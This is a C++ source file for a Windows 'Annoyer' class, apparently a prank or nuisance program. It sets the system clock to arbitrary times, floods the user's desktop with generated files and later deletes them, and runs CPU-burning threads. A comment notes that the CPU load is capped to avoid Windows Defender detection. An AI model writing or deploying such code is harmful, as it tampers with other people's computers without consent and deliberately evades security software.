#include "Main.h"
#include "Annoyer.h"
#include "Utils.h"
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <windows.h>

Annoyer::Annoyer()
{
	time_t now = time(NULL);
	localtime_s(&born_date, &now);
}

int Annoyer::j_cli_with_msg(char* msg) {
	return -1;
}

int Annoyer::j_desktop_shuffle() {
	return -1;
}


int Annoyer::j_time_date_mod(tm* t, bool mod_date) {
	SYSTEMTIME st;
	time_t now = time(NULL);
	struct tm now_struct;

	localtime_s(&now_struct, &now);

	st.wHour = t->tm_hour;
	st.wMinute = t->tm_min;
	st.wSecond = t->tm_sec;
	st.wMilliseconds = 000;

	if (mod_date) {
		st.wYear = t->tm_year;
		st.wMonth = t->tm_mon;
		st.wDay = t->tm_mday;
	}
	else { // Set current date
		st.wYear = now_struct.tm_year + 1900;
		st.wMonth = now_struct.tm_mon + 1;
		st.wDay = now_struct.tm_mday;
	}

	if (SetSystemTime(&st)) {
		return 0;
	}
	else {
		return -1;
	}

	return 0;
}

int Annoyer::j_files_creation(int max_files, Filename_fmt fn_fmt) {
	PWSTR desk_path = get_desktop_path();
	std::wstringstream ss;

	if (!desk_path) {
		return -1;
	}

	for (int i = 0; i < max_files; i++) {
		ss.str(L"");
		ss.clear();
		ss << desk_path << L"\\" << gen_filename(fn_fmt);

		HANDLE h = CreateFile(ss.str().c_str(),
			GENERIC_WRITE,
			0,
			0,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			0);

		if (h)
		{
			CloseHandle(h);
		}
		else {
			CoTaskMemFree(desk_path);
			return -1;
		}
	}

	CoTaskMemFree(desk_path);
	return 0;
}

int Annoyer::j_files_removal() {
	PWSTR desk_path = get_desktop_path();
	std::vector<std::wstring> files;
	std::vector<std::wstring>::iterator  it;

	if (!desk_path) {
		return -1;
	}

	files = get_goblin_files_from_path(desk_path);

	for (it = files.begin(); it != files.end(); it++) {
		DeleteFileW((*it).c_str()); // Don't care if the delete fails
	}

	CoTaskMemFree(desk_path);
	return 0;
}

int Annoyer::j_cpu_burn(int seconds) {
	std::atomic_bool stop_flag;
	stop_flag.store(false);

	// 4 threads to warm that CPU. More power triggers Windows Defender detection
	std::thread heater_thread_1(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_2(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_3(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_4(heat_cpu, std::ref(stop_flag));

	// Wait the designated time
	std::this_thread::sleep_for(std::chrono::seconds(seconds));

	// Notify the threads the game has finished
	stop_flag.store(true);

	heater_thread_1.join();
	heater_thread_2.join();
	heater_thread_3.join();
	heater_thread_4.join();

	return 0;
}

